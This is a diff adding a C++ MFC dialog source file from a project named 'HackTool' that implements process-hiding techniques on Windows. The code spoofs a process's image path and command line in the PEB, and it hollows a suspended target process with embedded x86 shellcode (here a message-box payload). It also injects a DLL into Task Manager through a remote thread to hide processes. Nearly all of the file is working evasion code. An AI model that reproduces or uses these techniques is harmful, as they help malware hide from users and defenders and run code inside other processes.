@@ -1,0 +1,409 @@
+﻿// CHideDlg.cpp: 实现文件
+//
+
+#include "pch.h"
+#include "HackTool.h"
+#include "CHideDlg.h"
+#include "afxdialogex.h"
+#include <winternl.h>
+#include "CInjectDlg.h"
+#include <TlHelp32.h>
+
+//定义函数指针
+typedef NTSTATUS(WINAPI* typedef_NtQueryInformationProcess)(
+	_In_      HANDLE           ProcessHandle,
+	_In_      PROCESSINFOCLASS ProcessInformationClass,
+	_Out_     PVOID            ProcessInformation,
+	_In_      ULONG            ProcessInformationLength,
+	_Out_opt_ PULONG           ReturnLength);
+
+// CHideDlg 对话框
+
+IMPLEMENT_DYNAMIC(CHideDlg, CDialogEx)
+
+CHideDlg::CHideDlg(CWnd* pParent /*=nullptr*/)
+	: CDialogEx(IDD_DIALOG_HIDE, pParent)
+	, m_Path(_T("伪装与傀儡需拖入目标程序"))
+{
+
+}
+
+CHideDlg::~CHideDlg()
+{
+}
+
+void CHideDlg::DoDataExchange(CDataExchange* pDX)
+{
+	CDialogEx::DoDataExchange(pDX);
+	DDX_Text(pDX, IDC_EDIT1, m_Path);
+}
+
+
+BEGIN_MESSAGE_MAP(CHideDlg, CDialogEx)
+	ON_BN_CLICKED(IDC_BUTTON1, &CHideDlg::OnBnClickedButton1)
+	ON_BN_CLICKED(IDC_BUTTON2, &CHideDlg::OnBnClickedButton2)
+	ON_WM_DROPFILES()
+	ON_BN_CLICKED(IDC_BUTTON3, &CHideDlg::OnBnClickedButton3)
+	ON_BN_CLICKED(IDC_BUTTON4, &CHideDlg::OnBnClickedButton4)
+END_MESSAGE_MAP()
+
+
+// CHideDlg 消息处理程序
+
+//进程伪装按钮
+void CHideDlg::OnBnClickedButton1()
+{
+	// TODO: 在此添加控件通知处理程序代码
+
+	//检测是否为exe
+	LPTSTR pszExtension = PathFindExtension(m_Path);
+	if (lstrcmp(pszExtension, L".exe") != 0)
+	{
+		MessageBox(_T("请先拖拽有效的exe文件"));
+		return;
+	}
+
+	//检测文件是否存在
+	if (GetFileAttributes(m_Path) == INVALID_FILE_ATTRIBUTES)
+	{
+		MessageBox(_T("文件不存在 请重试！"));
+		return;
+	}
+
+	//判断当前系统是否是32位，进程伪装技术必须在对应的操作系统才能生效
+	BOOL bRet = IsSystem32();
+	if (bRet)
+	{
+		//伪装本进程位explorer.exe
+		if(DisguiseProcess(GetCurrentProcessId(), m_Path.GetBuffer()))
+		{
+			MessageBox(_T("伪装进程explorer.exe为成功！"));
+		}
+	}
+	else
+	{
+		MessageBox(_T("请在32位系统下运行此功能"));
+	}
+	return;
+}
+
+//傀儡进程按钮
+void CHideDlg::OnBnClickedButton2()
+{
+	// TODO: 在此添加控件通知处理程序代码
+
+	// 弹窗 Shellcode
+	unsigned char data[624] = {
+		0x55, 0x8B, 0xEC, 0x83, 0xC4, 0xFC, 0x60, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x7D,
+		0x08, 0x81, 0xE7, 0x00, 0x00, 0xFF, 0xFF, 0x66, 0x81, 0x3F, 0x4D, 0x5A, 0x75, 0x12, 0x8B, 0xF7,
+		0x03, 0x76, 0x3C, 0x81, 0x3E, 0x50, 0x45, 0x00, 0x00, 0x75, 0x05, 0x89, 0x7D, 0xFC, 0xEB, 0x10,
+		0x81, 0xEF, 0x00, 0x00, 0x01, 0x00, 0x81, 0xFF, 0x00, 0x00, 0x00, 0x70, 0x72, 0x02, 0xEB, 0xD7,
+		0x61, 0x8B, 0x45, 0xFC, 0xC9, 0xC2, 0x04, 0x00, 0x55, 0x8B, 0xEC, 0x83, 0xC4, 0xFC, 0x60, 0xC7,
+		0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B,
+		0x40, 0x1C, 0x8B, 0x00, 0x8B, 0x40, 0x08, 0x89, 0x45, 0xFC, 0x61, 0x8B, 0x45, 0xFC, 0xC9, 0xC3,
+		0x55, 0x8B, 0xEC, 0x83, 0xC4, 0xFC, 0x60, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x64, 0xA1,
+		0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x1C, 0x8B, 0x00, 0x8B, 0x00, 0x8B, 0x40,
+		0x08, 0x89, 0x45, 0xFC, 0x61, 0x8B, 0x45, 0xFC, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xC4, 0xFC,
+		0x60, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x64, 0x8B, 0x35, 0x30, 0x00, 0x00, 0x00, 0x8B,
+		0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B, 0x46, 0x08, 0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x38, 0x4F, 0x18,
+		0x75, 0xF3, 0x89, 0x45, 0xFC, 0x61, 0x8B, 0x45, 0xFC, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xC4,
+		0xF8, 0x60, 0x33, 0xC9, 0x8B, 0x55, 0x0C, 0x8A, 0x02, 0x0A, 0xC0, 0x74, 0x04, 0x41, 0x42, 0xEB,
+		0xF6, 0x89, 0x4D, 0xF8, 0x8B, 0x75, 0x08, 0x03, 0x76, 0x3C, 0x8B, 0x76, 0x78, 0x03, 0x75, 0x08,
+		0x33, 0xD2, 0x8B, 0x5E, 0x20, 0x03, 0x5D, 0x08, 0x56, 0x8B, 0x75, 0x0C, 0x8B, 0x3B, 0x03, 0x7D,
+		0x08, 0x8B, 0x4D, 0xF8, 0xF3, 0xA6, 0x75, 0x03, 0x5E, 0xEB, 0x0A, 0x5E, 0x42, 0x83, 0xC3, 0x04,
+		0x3B, 0x56, 0x18, 0x72, 0xE3, 0x8B, 0x5E, 0x24, 0x03, 0x5D, 0x08, 0xB8, 0x02, 0x00, 0x00, 0x00,
+		0xF7, 0xE2, 0x03, 0xD8, 0x0F, 0xB7, 0x03, 0x8B, 0x5E, 0x1C, 0x03, 0x5D, 0x08, 0xB9, 0x04, 0x00,
+		0x00, 0x00, 0xF7, 0xE1, 0x03, 0xD8, 0x8B, 0x03, 0x03, 0x45, 0x08, 0x89, 0x45, 0xFC, 0x61, 0x8B,
+		0x45, 0xFC, 0xC9, 0xC2, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x75, 0x73,
+		0x65, 0x72, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63,
+		0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72,
+		0x61, 0x72, 0x79, 0x41, 0x00, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41,
+		0x00, 0x49, 0x20, 0x61, 0x6D, 0x20, 0x44, 0x65, 0x6D, 0x6F, 0x6E, 0x47, 0x61, 0x6E, 0x00, 0x00,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x65, 0x6D, 0x6F, 0x6E,
+		0x47, 0x61, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0x60, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x81, 0xEB, 0xB6, 0x11, 0x40, 0x00, 0xE8, 0xAE, 0xFE,
+		0xFF, 0xFF, 0x0B, 0xC0, 0x75, 0x05, 0xE9, 0x9A, 0x00, 0x00, 0x00, 0x89, 0x83, 0x46, 0x11, 0x40,
+		0x00, 0x8D, 0x83, 0x59, 0x11, 0x40, 0x00, 0x50, 0xFF, 0xB3, 0x46, 0x11, 0x40, 0x00, 0xE8, 0xE8,
+		0xFE, 0xFF, 0xFF, 0x0B, 0xC0, 0x75, 0x02, 0xEB, 0x7C, 0x89, 0x83, 0xA4, 0x11, 0x40, 0x00, 0x8D,
+		0x83, 0x68, 0x11, 0x40, 0x00, 0x50, 0xFF, 0xB3, 0x46, 0x11, 0x40, 0x00, 0xFF, 0x93, 0xA4, 0x11,
+		0x40, 0x00, 0x0B, 0xC0, 0x75, 0x02, 0xEB, 0x5D, 0x89, 0x83, 0xA8, 0x11, 0x40, 0x00, 0x8D, 0x83,
+		0x4E, 0x11, 0x40, 0x00, 0x50, 0xFF, 0x93, 0xA8, 0x11, 0x40, 0x00, 0x0B, 0xC0, 0x75, 0x02, 0xEB,
+		0x44, 0x89, 0x83, 0x4A, 0x11, 0x40, 0x00, 0x8D, 0x83, 0x75, 0x11, 0x40, 0x00, 0x50, 0xFF, 0xB3,
+		0x4A, 0x11, 0x40, 0x00, 0xFF, 0x93, 0xA4, 0x11, 0x40, 0x00, 0x0B, 0xC0, 0x75, 0x02, 0xEB, 0x25,
+		0x89, 0x83, 0xAC, 0x11, 0x40, 0x00, 0x8D, 0x83, 0x81, 0x11, 0x40, 0x00, 0x8D, 0x8B, 0x9B, 0x11,
+		0x40, 0x00, 0x6A, 0x04, 0x51, 0x50, 0x6A, 0x00, 0xFF, 0x93, 0xAC, 0x11, 0x40, 0x00, 0x83, 0xF8,
+		0x06, 0x74, 0x02, 0x61, 0xC3, 0x61, 0xE9, 0xDE, 0xC4, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00
+	};
+
+	//检测是否为exe
+	LPTSTR pszExtension = PathFindExtension(m_Path);
+	if (lstrcmp(pszExtension, L".exe") != 0)
+	{
+		MessageBox(_T("请先拖拽有效的exe文件"));
+		return;
+	}
+
+	//检测文件是否存在
+	if (GetFileAttributes(m_Path) == INVALID_FILE_ATTRIBUTES)
+	{
+		MessageBox(_T("文件不存在 请重试！"));
+		return;
+	}
+
+	//使用Shellcode替换目标进程
+	USES_CONVERSION;
+	char* pszFileName = T2A(m_Path);
+	if (ReplaceProcess(pszFileName, data, 624, 432))
+	{
+		MessageBox(_T("替换目标成功"));
+	}
+}
+
+//隐藏进程按钮
+void CHideDlg::OnBnClickedButton3()
+{
+	// TODO: 在此添加控件通知处理程序代码
+	
+	//要注入的进程名（任务管理器 win7 32位taskmgr.exe  win10 64位Taskmgr.exe）
+#ifndef _WIN64
+	char pszProcseeName[MAX_PATH] = "taskmgr.exe";
+#else
+	char pszProcseeName[MAX_PATH] = "Taskmgr.exe";
+#endif
+
+	//获取要注入的进程ID
+	DWORD nPid = GetProcessIdByProcessName(pszProcseeName);
+	//获取当前程序所在路径
+	char pszFileName[MAX_PATH] = { 0 };
+	GetModuleFileNameA(NULL, pszFileName, MAX_PATH);
+
+	if (nPid != 0)
+	{
+		//获取当前程序所在目录
+		(strrchr(pszFileName, '\\'))[0] = 0;
+		//拼接要注入dll路径
+		char pszDllName[MAX_PATH] = { 0 };
+		sprintf_s(pszDllName, "%s\\%s", pszFileName, "HIdeProcessDll.dll");
+		//远程线程注入DLL
+		CInjectDlg myInject;
+		myInject.CreateRemoteThreadInjectDll(nPid, pszDllName);
+	}
+
+}
+
+//Dll劫持按钮
+void CHideDlg::OnBnClickedButton4()
+{
+	// TODO: 在此添加控件通知处理程序代码
+	MessageBox(_T("请查看菜单-->帮助-->隐藏技术-->DLL劫持"));
+}
+
+// 修改指定PEB中的路径和命令行信息, 实现进程伪装
+BOOL CHideDlg::DisguiseProcess(DWORD dwProcessId, wchar_t *lpwszPath)
+{
+	// 打开进程获取句柄
+	HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
+	if (NULL == hProcess)
+	{
+		MessageBox(_T("打开进程失败！"));
+		return FALSE;
+	}
+
+	//定义函数指针变量
+	typedef_NtQueryInformationProcess NtQueryInformationProcess = NULL;
+	PROCESS_BASIC_INFORMATION pbi = { 0 };
+	PEB peb = { 0 };
+	RTL_USER_PROCESS_PARAMETERS Param = { 0 };
+	USHORT usCmdLen = 0;
+	USHORT usPathLen = 0;
+
+	// 需要通过 LoadLibrary、GetProcessAddress 从 ntdll.dll 中获取地址
+	NtQueryInformationProcess = (typedef_NtQueryInformationProcess)::GetProcAddress(
+		::LoadLibrary(_T("ntdll.dll")), "NtQueryInformationProcess");
+	if (NULL == NtQueryInformationProcess)
+	{
+		MessageBox(_T("获取NtQueryInformationProcess函数地址失败！"));
+		return FALSE;
+	}
+
+	// 获取指定进程的基本信息
+	NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
+	if (!NT_SUCCESS(status))
+	{
+		MessageBox(_T("获取进程的基本信息失败！"));
+		return FALSE;
+	}
+
+	// 获取指定进程基本信息结构中的PebBaseAddress
+	::ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
+	// 获取指定进程环境块结构中的ProcessParameters, 注意指针指向的是指定进程空间
+	::ReadProcessMemory(hProcess, peb.ProcessParameters, &Param, sizeof(Param), NULL);
+
+	// 修改指定PEB中的路径信息, 注意指针指向的是指定进程空间
+	usPathLen = 2 + 2 * ::wcslen(lpwszPath);
+	::WriteProcessMemory(hProcess, Param.ImagePathName.Buffer, lpwszPath, usPathLen, NULL);
+	::WriteProcessMemory(hProcess, &Param.ImagePathName.Length, &usPathLen, sizeof(usPathLen), NULL);
+
+	//通过路径获取文件名
+	PathStripPath(lpwszPath);
+	// 修改指定PEB中的命令行信息, 注意指针指向的是指定进程空间
+	//此时lpwszPath为文件名，不是路径了
+	usCmdLen = 2 + 2 * ::wcslen(lpwszPath);	
+	::WriteProcessMemory(hProcess, Param.CommandLine.Buffer, lpwszPath, usCmdLen, NULL);
+	::WriteProcessMemory(hProcess, &Param.CommandLine.Length, &usCmdLen, sizeof(usCmdLen), NULL);
+
+
+	return TRUE;
+}
+
+//判断当前系统是否是32位 是32位返回TRUE 不是返回FALSE
+BOOL CHideDlg::IsSystem32()
+{
+	SYSTEM_INFO si = { 0 };
+	GetNativeSystemInfo(&si);
+	if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
+		si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
+	{
+		return FALSE;
+	}
+	else
+	{
+		return TRUE;
+	}
+}
+
+BOOL CHideDlg::ReplaceProcess(char *pszFilePath, PVOID pReplaceData, DWORD dwReplaceDataSize, DWORD dwRunOffset)
+{
+	STARTUPINFOA si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
+	CONTEXT threadContext = { 0 };
+	BOOL bRet = FALSE;
+	::RtlZeroMemory(&si, sizeof(si));
+	::RtlZeroMemory(&pi, sizeof(pi));
+	::RtlZeroMemory(&threadContext, sizeof(threadContext));
+	si.cb = sizeof(si);
+	// 创建进程并挂起主线程
+	bRet = ::CreateProcessA(pszFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+	if (FALSE == bRet)
+	{
+		MessageBox(_T("创建挂起主线程失败！"));
+		return FALSE;
+	}
+	// 在进程中申请一块内存
+	LPVOID lpDestBaseAddr = ::VirtualAllocEx(pi.hProcess, NULL, dwReplaceDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if (NULL == lpDestBaseAddr)
+	{
+		MessageBox(_T("申请内存失败！"));
+		return FALSE;
+	}
+	// 写入Shellcode数据
+	bRet = ::WriteProcessMemory(pi.hProcess, lpDestBaseAddr, pReplaceData, dwReplaceDataSize, NULL);
+	if (FALSE == bRet)
+	{
+		MessageBox(_T("写入Shelcode失败！"));
+		return FALSE;
+	}
+	// 获取线程上下文
+	threadContext.ContextFlags = CONTEXT_FULL;
+	bRet = ::GetThreadContext(pi.hThread, &threadContext);
+	if (FALSE == bRet)
+	{
+		MessageBox(_T("获取线程上下文失败！"));
+		return FALSE;
+	}
+	// 修改进程中PE文件的入口地址
+	threadContext.Eip = (DWORD)lpDestBaseAddr + dwRunOffset;
+	// 设置挂起进程的线程上下文
+	bRet = ::SetThreadContext(pi.hThread, &threadContext);
+	if (FALSE == bRet)
+	{
+		MessageBox(_T("设置挂起线程的上下文失败！"));
+		return FALSE;
+	}
+	// 恢复挂起进程的线程
+	::ResumeThread(pi.hThread);
+	return TRUE;
+}
+
+void CHideDlg::OnDropFiles(HDROP hDropInfo)
+{
+	// TODO: 在此添加消息处理程序代码和/或调用默认值
+
+	//获取文件路径
+	TCHAR szPath[MAX_PATH] = { 0 };
+	DragQueryFile(hDropInfo, 0, szPath, MAX_PATH);
+
+	//过滤后缀名是否为exe
+	LPTSTR pszExtension = PathFindExtension(szPath);
+	if (lstrcmp(pszExtension, L".exe") == 0)
+	{
+		//显示到控件上
+		m_Path = szPath;
+		UpdateData(FALSE);
+	}
+	else
+	{
+		MessageBox(L"请拖入有效的exe文件");
+		//显示到控件上
+		m_Path = _T("请将文件拖拽到此处");
+		UpdateData(FALSE);
+	}
+	CDialogEx::OnDropFiles(hDropInfo);
+}
+
+BOOL CHideDlg::OnInitDialog()
+{
+	CDialogEx::OnInitDialog();
+
+	// TODO:  在此添加额外的初始化
+
+	//管理员模式下取消过滤拖拽消息
+	ChangeWindowMessageFilter(WM_DROPFILES, MSGFLT_ADD);
+	ChangeWindowMessageFilter(0x0049, MSGFLT_ADD);       // 0x0049 == WM_COPYGLOBALDATA
+
+	return TRUE;  // return TRUE unless you set the focus to a control
+				  // 异常: OCX 属性页应返回 FALSE
+}
+
+//根据进程名获取PID
+DWORD CHideDlg::GetProcessIdByProcessName(char* pszProcessName)
+{
+	//1.创建进程快照
+	HANDLE hSnap = CreateToolhelp32Snapshot(
+		TH32CS_SNAPPROCESS,            //遍历进程快照1
+		0);                            //进程PID
+	if (NULL == hSnap)
+	{
+		MessageBox(_T("创建进程快照失败！"));
+		return 0;
+	}
+
+	//2.获取第一条进程快照信息
+	PROCESSENTRY32  stcPe = { sizeof(stcPe) };
+	if (Process32First(hSnap, &stcPe))
+	{
+
+		//3.循环遍历进程Next
+		do {
+
+			//获取快照信息
+			USES_CONVERSION;
+			CString ProcessName = A2T(pszProcessName);
+			if (!lstrcmp(stcPe.szExeFile, ProcessName))
+			{
+				//4.关闭句柄
+				CloseHandle(hSnap);
+				return stcPe.th32ProcessID;
+			}
+
+		} while (Process32Next(hSnap, &stcPe));
+
+	}
+
+	//4.关闭句柄
+	CloseHandle(hSnap);
+	return 0;
+}
+
+
+
